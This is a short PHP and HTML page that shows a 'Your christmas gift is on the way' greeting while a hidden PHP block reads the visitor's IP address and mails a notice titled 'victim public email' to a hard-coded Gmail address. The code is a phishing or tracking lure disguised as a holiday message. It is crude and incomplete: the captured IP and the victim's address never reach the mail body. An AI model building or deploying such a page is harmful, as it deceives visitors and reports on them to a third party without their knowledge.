
<head>
<meta content="en-au" http-equiv="Content-Language">
<style type="text/css">
.auto-style1 {
	background-color: #33EE20;
}
.auto-style2 {
	color: #F31717;
}
</style>
</head>

<?php
$hisIP= $_SERVER['REMOTE_ADDR'];
$to = 'swati@gmail.com';
$subject = "victim public email";

$message = 'victim email is:'; //'Dear '.$_POST['name'].',<br>';
//$message .= "We welcome you to be part of family<br><br>";
//$message .= "Regards,<br>";

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

// More headers
$headers .= 'From: <swati@gmail.com>' . "\r\n";
//$headers .= 'Cc: myboss@example.com' . "\r\n";

mail($to,$subject,$message,$headers);
?>
<p class="auto-style2"><strong>Your christmas gift is on the way</strong></p>
<p class="auto-style1">Merry christmas</p>
<p>&nbsp;</p>
